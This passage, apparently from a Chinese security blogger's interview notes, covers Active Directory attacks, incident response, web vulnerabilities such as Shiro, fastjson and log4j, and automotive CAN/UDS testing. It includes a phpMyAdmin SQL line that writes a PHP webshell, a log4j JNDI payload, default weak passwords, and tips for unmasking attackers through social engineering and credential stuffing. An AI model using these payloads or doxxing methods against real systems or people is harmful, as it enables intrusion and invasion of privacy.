域内攻击有什么方法</h3><p>域内攻击可以分为普通的攻击、kerberos和中继攻击的攻击，他们可以构成明文密码泄露、伪造票据、抓取内存哈希等敏感信息泄露，并通过IPC共享、PTT、PTH、PTK传递进行横向渗透。当有其他漏洞，例如永恒之蓝、zeroLogon、noPac、打印机服务（Printnightmare）、Exchange服务（proxy系列漏洞）时，可以一步到位获取到该机器的权限（甚至时域控），然后进行进一步攻击。</p><p>普通攻击有：通过smb、ldap等攻击进行匿名通道查询，然后有密码喷洒、LAPS密码泄露、本地密码泄露（浏览器啥的）、dcsync（高权限）脱密码哈希、LSASS脱密码哈希，然后进行传递</p><p>Kerberos：委派攻击、（限制资源的）约束委派攻击、MS14-068、金银票据、这些可以伪造票据。注入到内存中，可以访问任意/指定服务。当然还有TGS的kerberoasting爆破和TGT的as-req roasting爆破</p><p>NTLM中继：通过中继获取到NTLM，中继的协议可以是LDAP、SMB、HTTP等</p><h3 id="说一下委派攻击"><a class="markdownIt-Anchor" href="#说一下委派攻击"></a> 说一下委派攻击</h3><p>委派机制：域允许用户向拥有委派功能的服务账户，为该用户申请其他服务的票据</p><p>参考：</p><ul><li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41874930/article/details/110633298">https://blog.csdn.net/qq_41874930/article/details/110633298</a></li><li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1899592">https://cloud.tencent.com/developer/article/1899592</a></li><li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/541536208">https://zhuanlan.zhihu.com/p/541536208</a></li></ul><h4 id="非约束委派"><a class="markdownIt-Anchor" href="#非约束委派"></a> 非约束委派</h4><p>服务账号可以获取被委派用户的TGT，并将TGT缓存到LSASS进程中，从而服务账号可使用该TGT，模拟用户访问任意服务。此时，只要DC访问了我们的服务主机，就可以DUMP出DC的TGT，拿到域控。所以诱导DC访问我们即可。如何诱导呢？</p><h4 id="约束委派"><a class="markdownIt-Anchor" href="#约束委派"></a> 约束委派</h4><p>添加了两个协议：s4u3self和s4u2proxy</p><ol><li>用户A访问service1。</li><li>service1通过s4u2self协议代表用户A去请求一个可以访问service1自身的可转发的ticket，这个ticket代表域控授权service1可以以用户A的身份进行操作。（ST1）</li><li>service1以用户A的身份访问KDC请求一个访问service2的可转发的ticket（ST2）</li><li>service1获取到ticket并以用户A的名义访问service2。</li></ol><blockquote><p>第一个ticket表示域控授权service1代表用户A来访问service1，第二个ticket代表域控授权service1代表用户来访问service2。</p><p>总的来说</p><ul><li>s4u2self解决的问题就是，确定了某台主机可以代表某用户来<strong>对自己进行操作</strong>。</li></ul><ul><li>s4u2proxy解决的问题是确定了某台主机可以代表某用户<strong>对其他主机进行操作</strong>。</li></ul></blockquote><p>综上所述，对<strong>约束性委派利用对核心就是获得可转发的ticket票据</strong>。获取根据约束性委派的执行过程可知，只要控制配置约束性委派服务的机器，并获得了它的密码，那么我们就可以劫持这台主机的kerberos请求过程，伪造S4U的请求，伪装成服务用户以任意用户的权限申请访问指定服务的ST2，最终获得任意用户权限的ticket票据，这一行为可通过kekeo完成。</p><p>操作过程如下：</p><ol><li>找到有委派的机器（通过adfind即可）</li><li>在我们现在控制的机器下，dump哈希，找到该委派机器的NTLM哈希</li><li>使用该哈希生成委派机器的TGT票据（使用kekeo即可）</li><li>利用这个票据通过伪造S4U请求，以administrator身份访问委派机器的ST</li><li>将得到的ticket导入内存即可</li></ol><h4 id="基于资源的约束委派攻击"><a class="markdownIt-Anchor" href="#基于资源的约束委派攻击"></a> 基于资源的约束委派攻击</h4><p>与传统的约束委派相比，<strong>它不再需要域管理员权限去设置相关属性</strong>。RBCD把设置委派的权限赋予了机器自身，既机器自己可以决定谁可以被委派来控制我。</p><ol><li>创建机器账号，添加机器账号并设置为资源委派</li><li>请求票据</li></ol><h3 id="获取域控权限的方法"><a class="markdownIt-Anchor" href="#获取域控权限的方法"></a> 获取域控权限的方法</h3><p>通过服务获取：例如打印机、exchange、tomcat、jboss后台</p><p>通过漏洞获取：zeroLogon、noPac、SYSVOL&amp;GPP、certifried漏洞、永恒之蓝</p><p>通过暴力破解/伪造获取：kerberoasting、MS14-068、委派攻击、DCSync</p><p>通过中继攻击等</p><h3 id="如何定位域控"><a class="markdownIt-Anchor" href="#如何定位域控"></a> 如何定位域控</h3><ul><li>使用命令行工具<ul><li><code>nslookup -type=srv _ldap._tcp.dc._msdcs.domain.com</code></li><li><code>nltest /dclist:domain.com</code></li><li>或者：<code>net group &quot;Domain controllers&quot; /Domain</code>，加上<code>net time /domain</code>显示域控时间</li></ul></li><li>使用Active Directory Sites and Services</li><li>使用PowerShell脚本<ul><li>通过<code>Get-ADDomainController</code>命令获取域控制器信息:<code>Get-ADDomainController -Discover -Service PrimaryDC</code></li></ul></li></ul><h3 id="黄金票据和白银票据说一下"><a class="markdownIt-Anchor" href="#黄金票据和白银票据说一下"></a> 黄金票据和白银票据说一下？</h3><h3 id="权限维持怎么做"><a class="markdownIt-Anchor" href="#权限维持怎么做"></a> 权限维持怎么做</h3><p>分为几个，先区分windows和linux系统。常用的例如自启动、注册表、DLL劫持、计划任务啥的。</p><p>还有就是针对域：</p><ol><li>skeleton key万能钥匙</li><li>DSRM域后门</li><li>金银票据</li><li>sid history</li></ol><h2 id="命令与工具"><a class="markdownIt-Anchor" href="#命令与工具"></a> 命令与工具</h2><h3 id="代理转发工具有什么"><a class="markdownIt-Anchor" href="#代理转发工具有什么"></a> 代理转发工具有什么</h3><ol><li>reGeorg（上传后正向连接）</li><li>frp</li><li>ew</li><li>Venom</li></ol><h3 id="查看进程命令"><a class="markdownIt-Anchor" href="#查看进程命令"></a> 查看进程命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc</span><br><span class="line">ps aux</span><br></pre></td></tr></table></figure><h1 id="应急响应与溯源"><a class="markdownIt-Anchor" href="#应急响应与溯源"></a> 应急响应与溯源</h1><h2 id="应急响应的简单流程"><a class="markdownIt-Anchor" href="#应急响应的简单流程"></a> 应急响应的简单流程？</h2><ul><li>收集信息：由安全设备收集主机，样本信息，以及一些客户信息。</li><li>判断类型：是否是安全事件？具体为什么安全事件？挖矿？DOS？等。</li><li>深入分析：从系统角度深入分析，日志，进程，启动项这些去分析。</li><li>清理处置：杀掉异常进程，删除异常文件，打补丁或者修复相关文件等。</li><li>产出报告：对此次安全事件进行一个完整的文档描述</li></ul><h2 id="windowslinux被插入后门文件如何排查"><a class="markdownIt-Anchor" href="#windowslinux被插入后门文件如何排查"></a> Windows/Linux被插入后门文件，如何排查</h2><ol><li>检查日志文件</li><li>检查系统用户是否存在异常</li><li>检查异常进程以及隐藏进程</li><li>检查异常系统文件</li><li>检查端口防火墙</li><li>检查注册表、自启动</li></ol><h2 id="内网告警应该如何处理流程是怎么样的"><a class="markdownIt-Anchor" href="#内网告警应该如何处理流程是怎么样的"></a> 内网告警应该如何处理，流程是怎么样的？</h2><ol><li>具体定位到哪台机器，报警说明知道具体漏洞类型，打相应补丁。</li><li>利用webshell或者是shell查杀工具查杀，查看tmp目录下是非有带有免杀的木马。彻底清除。</li><li>再到全流量分析的机子上看，是非有经过其他的机器。</li><li>拿到攻击ip之后到线上的一些网站查看主机类型，比如360或者微步上，查看是否是傀儡机，vps跳板，或者是国内个人云主机。</li><li>如果是个人云主机，就可以通过whois查看是非有最近绑定的域名，或者绑定者的邮箱。</li><li>知道邮箱之后就可以反查询出qq号说多少，再利用社工查询到手机号，到一个知名的网站或知名软件上查询这个手机号有没有注册过什么网站，可以去这些网站通过撞库的方法登入，这样就可以拿到这个攻击者的身份证，学校，地址这些了</li></ol><h2 id="防火墙怎样判断这是一个反序列化漏洞"><a class="markdownIt-Anchor" href="#防火墙怎样判断这是一个反序列化漏洞"></a> 防火墙怎样判断这是一个反序列化漏洞</h2><p>过滤流量，例如:：</p><ol><li>PHP的序列化流量是：<code>O:s...</code>，而JAVA的反序列化流量的二进制数据流开头是：<code>AC ED 00 05 73 72 00 2E</code></li><li>特殊函数：例如<code>eval</code>、<code>__destruct</code>等等，而JAVA反序列化流量中包含敏感类名，例如<code>SimplePrincipalCollection</code>、<code>TemplatesImpl</code>、<code>JdbcRowSetImpl</code>等。</li></ol><h2 id="应急响应如何查找挖矿病毒如何通过进程找到挖矿文件"><a class="markdownIt-Anchor" href="#应急响应如何查找挖矿病毒如何通过进程找到挖矿文件"></a> 应急响应如何查找挖矿病毒，如何通过进程找到挖矿文件？</h2><ol><li><p>查看系统的CPU内存等资源利用率，找最高的进程（使用top），然后定位这个进程的路径在哪里，看看有没有端口开放、外联等</p><blockquote><p>使用top指令发现进程K</p><p>使用netstat -anop发现有无陌生的外连端口</p></blockquote></li><li><p>定位进程的父进程、路径、参数等等，将进程文件托到沙箱检测，看是否为挖矿程序（windows还可以用wmic分析进程参数）</p><blockquote><p><code>ps -ef | grep K</code>找到进程PID为10010</p><p>定位守护程序（关联的进程）：<code>systemctl status 10010</code></p></blockquote></li><li><p>查找是否有定时任务、开启了什么服务（端口），查看服务的日志，看看是否有ssh公钥写入的危险等</p></li></ol><p>处置：终止进程（先终止守护进程，再终止主进程）、清理定时任务、清理恶意文件、恢复服务的安全设置</p><h2 id="webshell流量交互的流量特征"><a class="markdownIt-Anchor" href="#webshell流量交互的流量特征"></a> Webshell流量交互的流量特征?</h2><ul><li>例如菜刀等明文或者base64编码传输数据的webshell而言，其特征有：大量<code>eval</code>等执行函数，还有<code>z0</code>和<code>int_set(&quot;display_errors&quot;,0)</code>的流量特征。</li><li>而对于冰蝎等加密流量而言，数据里面为加密数据，而且交互频繁，在连接shell的瞬间产生大量流量，无论是win窗口，还是长度，都表现一致</li></ul><h2 id="sql注入异常流量分析思路"><a class="markdownIt-Anchor" href="#sql注入异常流量分析思路"></a> SQL注入异常流量分析思路</h2><ol><li>短时间内多次查询，且语句构造的差异小</li><li>查询数据库的语句特征（关键字），例如<code>union/select/sleep/*</code></li></ol><h2 id="假设发现web应用服务器发现文件异常增多初步怀疑被上传webshell描述流量分析溯源的思路"><a class="markdownIt-Anchor" href="#假设发现web应用服务器发现文件异常增多初步怀疑被上传webshell描述流量分析溯源的思路"></a> 假设发现web应用服务器发现文件异常增多，初步怀疑被上传webshell，描述流量分析溯源的思路?</h2><ol><li>查找流量中有常见webshell的流量特征，例如：菜刀：z0、蚁剑：<code>int_set(“display_errors&quot;,0&quot;)</code>、还有常见恶意函数：eval、assert等，看是那个页面发起的，判断是否可能是webshell</li><li>找出异常IP和所上传的内容，判断是否是webshell，是的话就删除</li></ol><h2 id="sftptelnetssh的端口号ssh与telnet的区别"><a class="markdownIt-Anchor" href="#sftptelnetssh的端口号ssh与telnet的区别"></a> sftp，telnet，ssh的端口号？ssh与telnet的区别？</h2><ul><li>sftp：22，telnet：23，ssh：22。</li><li>简单来说，ssh和telnet的区别就是一个是密文传输，一个是明文传输</li></ul><h2 id="挖矿有了解吗"><a class="markdownIt-Anchor" href="#挖矿有了解吗"></a> 挖矿有了解吗？</h2><ol><li><p>传播：</p><ul><li>网络、邮件钓鱼</li><li>0day RCE：weblogic、jboss的反序列化漏洞，还有redis、hadoop的未授权访问等等</li><li>暴力破解：tomcat、mssql、ssh、rdp</li></ul></li><li><p>持久化：</p><ul><li>WMIC + bypass UAC实现白名单持久化</li><li>定时任务 + wget/curl</li><li>自启动 / 注册表</li></ul></li><li><p>挖矿程序的形态：例如javascript的coinhive还有门罗算法：XMRig</p></li><li><p>如何发现？</p><ol><li>进程 + CPU占用率 + 网络端口开放</li><li>自启动脚本：计划任务等</li><li>相关配置：iptables（防火墙）、/etc/hosts</li><li>日志文件</li></ol></li></ol><h2 id="常见的安全设备有什么"><a class="markdownIt-Anchor" href="#常见的安全设备有什么"></a> 常见的安全设备有什么</h2><p>IDS、IPS、防火墙、DDoS防护设备、蜜罐、WAF等等</p><h2 id="你监控的蜜罐是什么"><a class="markdownIt-Anchor" href="#你监控的蜜罐是什么"></a> 你监控的蜜罐是什么？</h2><p>该蜜罐部署了多个容易被攻击的系统，包括tomcat、redis、jboss等等，当攻击者踩到蜜罐，系统就会发送Jsonp，获取相关百度id，并且记录攻击者路径。</p><p>该系统还对流量进行分析，能够捕获到挖矿病毒的流量、代理转发流量、各种常见Payload</p><h2 id="拿到一个ip你会结合哪些平台上的情报进行溯源分析"><a class="markdownIt-Anchor" href="#拿到一个ip你会结合哪些平台上的情报进行溯源分析"></a> 拿到一个IP，你会结合哪些平台上的情报进行溯源分析？</h2><ol><li>去微步看看是不是恶意IP</li><li>反查域名，看有没有开启网站，然后搜集信息打反攻</li><li>定位完IP，就用百度等信息，查重名（微博、QQ等），去下面的社交平台看有没有敏感信息</li><li>查到电话查名字：支付宝转账确定姓氏、淘宝找回密码确定名字、企业微信手机号查公司名称</li></ol><h2 id="windows加固"><a class="markdownIt-Anchor" href="#windows加固"></a> Windows加固</h2><ul><li>修改3389端口、禁止445端口漏洞</li><li>设置安全策略，不允许SAM账户的匿名枚举，不允许</li><li>SAM账户和共享的匿名枚举在组策略中设置阻止访问注册表编辑工具</li><li>开启审核对象访问，开启审核目录服务访问，开启审核系统事件</li><li>设置屏幕保护在恢复时使用密码保护</li><li>设置Windows密码策略：设密码必须满足复杂性，设置密码长度最小值为8位，最长存留期为30天</li><li>开启Windows防火墙，关闭ping服务，打开3389、80等服务</li><li>关闭系统默认共享</li></ul><h2 id="linux加固"><a class="markdownIt-Anchor" href="#linux加固"></a> Linux加固</h2><ul><li><p>修改ssh的配置文件，禁止root直接登录</p></li><li><p>修改密码策略配置文件，确保密码最小长度为8位</p></li><li><p>确保错误登录3次，锁定此账户5分钟</p></li><li><p>禁止su非法提权，只允许root和wheel组用户su到root</p></li><li><p>不响应ICMP请求</p></li><li><p>设置登陆超时时间为10分钟，结束非法登录用户</p></li></ul><h1 id="漏洞相关"><a class="markdownIt-Anchor" href="#漏洞相关"></a> 漏洞相关</h1><h2 id="phpmyadmin-getshell"><a class="markdownIt-Anchor" href="#phpmyadmin-getshell"></a> phpmyadmin getshell</h2><p><strong>getshell有三种方法：</strong></p><ol><li><p>包含日志文件getshell（有包含漏洞，在网站根目录不可写的情况下）</p><p>设置日志记录打开+设置日志位置</p></li><li><p>into dumpfile和into outfile或者新表getshell</p><p>通过直接<code>select '&lt;?php @eval($_POST[cmd]);?&gt;' into outfile '/var/www/html/shell.php'</code></p><p>当然，得知道网站的根目录，</p></li><li><p>数据库慢查询</p><p>这个是绕过SE=NULL（限制不能输出到什么位置）的方法，慢查询是只有sleep（慢的查询）才会被记录，所以记得sleep一下，一样需要设置日志位置</p></li></ol><p><strong>根目录的查询方法：</strong></p><ol><li>看有没有phpinfo</li><li>执行<code>select @@basedir</code></li><li>看其他敏感文件有没有泄露的</li></ol><p><strong>通常通过爆破的手段进入后台，例如弱口令有：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root root(或空)</span><br><span class="line">mysql mysql</span><br></pre></td></tr></table></figure><p><strong>漏洞：</strong></p><ul><li>乌云的任意文件读取</li><li>CVE-2018-19968：任意文件包含/RCE</li><li>CVE-2016-5734 ：后台RCE</li><li>还有文件包含漏洞</li></ul><h2 id="nacos信息泄露"><a class="markdownIt-Anchor" href="#nacos信息泄露"></a> nacos（信息泄露）</h2><p>未授权访问：可以从它的众多api当中获取到用户名密码，然后登陆上去</p><p>反序列化漏洞：该漏洞听说只能触发一次</p><h2 id="fastjson反序列化"><a class="markdownIt-Anchor" href="#fastjson反序列化"></a> fastjson反序列化</h2><p>fastjson在进行序列化的时候会使用getter和setter方法，但是该方法无法在反序列化的时候将对象还原成响应的类，所以引用了autoType中的<code>@type</code>属性，用于指向反序列化之后的类对象，如果我们将之指向恶意类，便可以执行恶意代码。</p><p>通常我们可以使用的类有：</p><ul><li>使用<code>InetSocketAddress</code>类，进行dnslog探测漏洞存在性</li><li>使用JdbcRowSetImpl类进行RMI服务调用，可以触发远程代码执行（RCE），也可以远程创建文件</li><li>使用TemplatesImpl类进行JNDI注入，可以触发远程代码执行（RCE），也可以加载恶意的jar包</li></ul><p>如果是不出网的利用，则可以使用的类有：</p><p>不出网利用fastjson漏洞的类有（能自己生成恶意类的/能连上外面RMI的）：</p><ul><li>使用BCEL类进行字节码操作，可以触发远程代码执行（RCE），也可以执行任意命令。但是要求目标服务器有 fastjson 1.2.24 以下的版本，<strong>并且能够利用 Java 字节码操作库来生成和执行恶意的字节码</strong><ul><li>它使用bcel字节码然后使用classloader加载，重要在加载上，所以有两种常用的利用链</li><li>他又有两种，一种借助tomcat.dhcp的，一种是TemplatesImpl的</li></ul></li></ul><h2 id="shiro反序列化"><a class="markdownIt-Anchor" href="#shiro反序列化"></a> shiro反序列化</h2><p>它有550和721两种。</p><p>在Shiro框架下，用户登陆成功后会生成一个经过加密的Cookie。其Cookie的Key的值为RememberMe，Value的值是经过<strong>序列化</strong>、<strong>AES加密</strong>和<strong>Base64编码</strong>后得到的结果。</p><p>服务端在接收到一个Cookie时，会按照如下步骤进行解析处理：</p><p>1.检索RememberMe Cookie的值</p><p>2.进行Base64解码</p><p>3.进行AES解码</p><p>4.进行反序列化操作</p><p>在第4步中的调用反序列化时未进行任何过滤，进而可以导致触发远程代码执行漏洞。(550：此时的AES密钥为硬编码，所以可以枚举或者直接用默认的)</p><p><strong>Shiro550 反序列化漏洞原理：</strong></p><p>RememberMe功能开启之后，会有Cookie 数据，Cookie 数据其实就是加密后的经过序列化的用户对象，也就是二进制字节流。加密算法是AES 算法，算法很安全，但是秘钥是固定的，并且存储于源码中。</p><p><strong>Shiro721 利用条件：</strong></p><p>AES 秘钥不在是固定的了，但是此秘钥可以被爆破</p><p>需要提供一个合法用户，再点击remmber me ，成功登录之后，获取Cookie remmber-me 的值。</p><p><strong>区别在于：</strong></p><p>Shiro-550，Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。Shiro-721，由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p><h2 id="log4j反序列化"><a class="markdownIt-Anchor" href="#log4j反序列化"></a> log4j反序列化</h2><p>本次漏洞是因为Log4j2组件中 lookup功能的实现类 <code>JndiLookup</code> 的设计缺陷导致，可以使用： <code>$&#123;jndi:ldap://http://xxx.dnslog.cn&#125;</code></p><h2 id="redis漏洞如何getshell"><a class="markdownIt-Anchor" href="#redis漏洞如何getshell"></a> redis漏洞如何getshell</h2><ol><li>定时任务：<code>/var/spoon/cron.d</code></li><li>ssh公钥</li><li>写webshell：知道网站路径（在低权限也能使用）</li><li>主从复制</li></ol><h2 id="docker逃逸漏洞"><a class="markdownIt-Anchor" href="#docker逃逸漏洞"></a> docker逃逸漏洞</h2><p>判断是否为docker环境：</p><ol><li>cgroup信息：<code>cat /proc/1/cgroup</code></li><li>dockerenv文件：<code>ls -alh /.dockerenv</code></li></ol><p>常见逃逸方法：</p><ol><li>利用dirty cow来进行docker逃逸：<code>VDSO其实就是将内核中的.so文件映射到内存，.so是基于Linux下的动态链接,其功能和作用类似与windows下.dll文件。</code></li><li>cve-2019-5736</li><li>docker配置不当：<ul><li>特权模式：当管理员执行<code>docker run -privileged</code>时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载</li><li>docket remote api未授权访问导致逃逸</li></ul></li></ol><h2 id="thinkphp"><a class="markdownIt-Anchor" href="#thinkphp"></a> thinkphp</h2><p>5.0RCE漏洞</p><h2 id="drupal"><a class="markdownIt-Anchor" href="#drupal"></a> Drupal</h2><ol><li>常见远程代码执行</li><li>当拿到shell，但是不是www-data账户，可以更改账户</li><li>进入后台，可以使用添加拓展模块php-code，调用filter，然后添加base page，在这个页面写上我们的反弹shell或者其他webshell都可以</li></ol><h1 id="车联网测试"><a class="markdownIt-Anchor" href="#车联网测试"></a> 车联网测试</h1><h2 id="基础类"><a class="markdownIt-Anchor" href="#基础类"></a> 基础类</h2><h3 id="说说几种总线以及他们的作用"><a class="markdownIt-Anchor" href="#说说几种总线以及他们的作用"></a> 说说几种总线以及他们的作用？</h3><p><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/image-20230831195842819.png" alt="image-20230831195842819"></p><p>分为CAN、LIN、FlexRay、MOST总线。</p><ul><li>CAN总线用于车辆通信，连接各路ECU，传讯方式为广播。其分为高压低压两条线，静止电压为2.5V，高低压偏移量为1V，引脚为2和7.</li><li>LIN总线是CAN总线的延申，它成本较低（速率比CAN低），连接一路ECU，传讯方式为主从式。电压为12V</li><li>FlexRay一般用于控制引擎控制/ABS/悬架控制/线控转向等，为周期通信方式</li><li>MOST为娱乐总线，是唤醒结构，只能朝一个方向前进</li><li>还有以太网。</li></ul><h3 id="can报文的组成部分"><a class="markdownIt-Anchor" href="#can报文的组成部分"></a> CAN报文的组成部分</h3><p><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/image-20230612104714733.png" alt="image-20230612104714733"></p><p>包含几个部分：帧起始段（1），仲裁段（12），控制段（2）、数据段（4+8）、CRC段（16）、ACK段（2）、帧结束（3）</p><h3 id="uds服务有哪些"><a class="markdownIt-Anchor" href="#uds服务有哪些"></a> UDS服务有哪些</h3><p>UDS由ISO-14229定义，有六个大类，26种诊断服务。其中常用的是：</p><ol><li>10：进入编程会话模式、切换会话模式</li><li>11：ECU复位</li><li>19：读取故障码</li><li>22 / 23：通过 ID / 地址 读取数据</li><li>27：安全访问，获取密钥</li><li>31：例程控制。启动 / 停止ECU中的某个例程</li><li>34：用于下载数据到ECU中</li><li>35：从ECU中上传数据</li><li>36：传输数据块</li></ol><h2 id="测试类"><a class="markdownIt-Anchor" href="#测试类"></a> 测试类</h2><h3 id="有什么测试项"><a class="markdownIt-Anchor" href="#有什么测试项"></a> 有什么测试项</h3><ol><li>整车拓扑——核心零件：中央网关、T-Box、IVI</li><li>应用场景：V2V、V2I通信以及相关设备（云端）</li><li>数据安全：车辆状态、车辆行驶轨迹等</li></ol><p><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/image-20230831215459652.png" alt="image-20230831215459652"></p><h3 id="wifi有什么攻击面"><a class="markdownIt-Anchor" href="#wifi有什么攻击面"></a> WIFI有什么攻击面</h3><ol><li>中断攻击</li><li>欺骗攻击</li></ol><h3 id="有什么攻击面"><a class="markdownIt-Anchor" href="#有什么攻击面"></a> 有什么攻击面</h3><ol><li>通过OBDII接口物理接入（还有USB/CD/MP3等接口）</li><li>通过蓝牙、WIFI等短距离接入（还有）</li><li>通过GSM远程接入</li></ol><h3 id="如何对车载系统进行端口扫描-漏洞扫描和嗅探分析"><a class="markdownIt-Anchor" href="#如何对车载系统进行端口扫描-漏洞扫描和嗅探分析"></a> 如何对车载系统进行端口扫描、漏洞扫描和嗅探分析？</h3><ol><li>通过CANoe/USBCAN等工具连接OBDII，然后使用对应的软件进行攻击，例如</li><li></li></ol><h3 id="通过obd-ii调试接口有什么测试can的项目如何测试"><a class="markdownIt-Anchor" href="#通过obd-ii调试接口有什么测试can的项目如何测试"></a> 通过OBD-II调试接口，有什么测试CAN的项目，如何测试？</h3><h3 id="测试ivi的流程"><a class="markdownIt-Anchor" href="#测试ivi的流程"></a> 测试IVI的流程</h3><h3 id="使用can刷写ecu和使用obd刷写ecu的不同刷写流程如何"><a class="markdownIt-Anchor" href="#使用can刷写ecu和使用obd刷写ecu的不同刷写流程如何"></a> 使用CAN刷写ECU和使用OBD刷写ECU的不同？刷写流程如何？</h3><p>OBD只能刷写车辆主要模块，例如ECM发动机控制模块、TCM变速箱控制模块等，而CAN总线刷写可以写任何模块。还有接口啥的，速度啥的也不同</p><p><strong>流程为：</strong></p><ul><li><strong>唤醒ECU</strong>：通过发送特定的报文或信号，使ECU从正常模式切换到bootloader模式，等待刷写命令。</li><li><strong>读取ECU信息</strong>：通过发送诊断服务（如22服务），读取ECU的硬件版本号、软件识别号、零件号等信息，以确定是否需要刷写。</li><li><strong>擦除存储器</strong>：通过发送诊断服务（如31服务），擦除ECU存储器中原有的application程序，为新程序腾出空间。</li><li><strong>下载程序</strong>：通过发送诊断服务（如34、36、37服务），将新程序分段传输到ECU存储器中，每段传输后进行校验和比对，确保数据正确无误。</li><li><strong>重启ECU</strong>：通过发送诊断服务（如11服务），使ECU重启并运行新程序，完成刷写过程。</li></ul><h3 id="uds刷写流程"><a class="markdownIt-Anchor" href="#uds刷写流程"></a> UDS刷写流程</h3><p>UDS刷写流程是基于ISO14229协议定义的一种ECU软件升级方法，它主要包括以下几个步骤：</p><ul><li>进入<strong>编程会话模式</strong>（<code>$10</code>），并请求<strong>种子和钥匙</strong>（<code>$27</code>）进行ECU解锁，获得读写权限。</li><li>请求<strong>例程控制</strong>（<code>$31</code>），执行刷写前的准备工作，如擦除内存、关闭报文等。</li><li>请求<strong>下载</strong>（<code>$34</code>），发送刷写数据的元信息，如地址、长度、压缩方式等。</li><li>进行<strong>数据传输</strong>（<code>$36</code>），分段发送刷写数据，每段数据后接收ECU的响应。</li><li>请求<strong>例程控制</strong>（<code>$31</code>），执行刷写后的操作，如校验、重启等。</li></ul></div><div class="article-footer"><blockquote class="mt-2x"><ul class="post-copyright list-unstyled"><li class="post-copyright-link hidden-xs"><strong>本文链接：</strong> <a href="https://j3f5.github.io/articles/2023/08/10/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/" title="面试整理" target="_blank" rel="external">https://j3f5.github.io/articles/2023/08/10/面试整理/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！</li></ul></blockquote><div class="panel panel-default panel-badger"><div class="panel-body"><figure class="media"><div class="media-left"><a href="https://github.com/j3f5" target="_blank" class="img-burn thumb-sm visible-lg"><img src="/images/avatar.jpg" class="img-rounded w-full" alt=""></a></div><div class="media-body"><h3 class="media-heading"><a href="https://github.com/j3f5" target="_blank"><span class="text-dark">妄想星空</span><small class="ml-1x">Web Pentestor</small></a></h3><div>网安小菜鸡，在线总结</div></div></figure></div></div></div></article><section id="comments"><div id="vcomments"></div></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="prev"><a href="/articles/2023/08/10/zeroLogon%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="zeroLogon漏洞复现"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a></li><li class="next"><a href="/articles/2023/08/08/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94%E5%B7%A5%E5%85%B7%E5%AE%9E%E9%AA%8C%E7%89%88/" title="内网安全（三）——工具实验版"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button"><span>[&nbsp;</span><span>文章目录</span> <i class="text-collapsed icon icon-anchor"></i> <i class="text-in icon icon-close"></i> <span>]</span></a></li></ul><div class="bar-right"></div></div></nav></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/j3f5" target="_blank" title="Github"><i class="icon icon-github"></i></a></li><li><a href="/atom.xml" target="_blank" title="Rss"><i class="icon icon-rss"></i></a></li></ul><div class="copyright"><div class="publishby">Theme by <a href="https://github.com/cofess" target="_blank">cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.</div></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"文章",PAGES:"页面",CATEGORIES:"分类",TAGS:"标签",UNTITLED:"(未命名)"},ROOT_URL:"/",CONTENT_URL:"/content.json"}</script><script src="/js/insight.js"></script><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/npm/valine"></script><script type="text/javascript">var GUEST=["nick","mail","link"],meta=(meta="nick,mail,link").split(",").filter(function(e){return-1<GUEST.indexOf(e)});new Valine({el:"#vcomments",verify:!1,notify:!0,appId:"yCi6g1FoJhBaWWsmJrysnhSM-gzGzoHsz",appKey:"okzCVsRtNdmyQDW34mMUxKOr",placeholder:"留言",avatar:"mm",meta:meta,pageSize:"10",visitor:!0})</script><script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.js"></script><script>$(document).ready(function(){$("article img").not("[hidden]").not(".panel-body img").each(function(){var a,t,n=$(this),e=n.attr("alt"),r=n.parent("a");r.length<1&&(-1!=(t=(a=this.getAttribute("src")).lastIndexOf("?"))&&(a=a.substring(0,t)),r=n.wrap('<a href="'+a+'"></a>').parent("a")),r.attr("data-fancybox","images"),e&&r.attr("data-caption",e)}),$().fancybox({selector:'[data-fancybox="images"]',hash:!1,loop:!1})})</script><style>.copy-btn{display:inline-block;padding:6px 